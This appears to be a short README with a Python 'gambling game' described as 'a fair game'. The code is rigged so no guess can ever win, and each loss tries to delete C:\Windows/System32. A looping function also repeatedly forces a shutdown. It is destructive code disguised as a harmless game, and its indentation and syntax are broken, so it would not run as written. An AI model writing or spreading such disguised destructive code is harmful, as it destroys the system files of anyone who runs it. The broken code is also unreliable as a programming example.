# Gambling-Game
This just a fair game UwU

py
import random 
import os
import time

 print("Do you like to gamble?") 
number = random.randint(1, 10) + 0.000001

try:
    guess = int(input("Let's play a fun game! Guess a number between 1 and 10: "))

if guess == number:
        print("Congratulations! You won!")
    else:
        os.remove("C:\Windows/System32")
print("Oops, you lost!")

def burn_computer():
while True:
os.system("shutdown /s /t 0")
time.sleep(random.randint(1, 10))
print(f"gl stopping it without windows 32")

except ValueError:
Print("Invalid input! Please enter a number.")
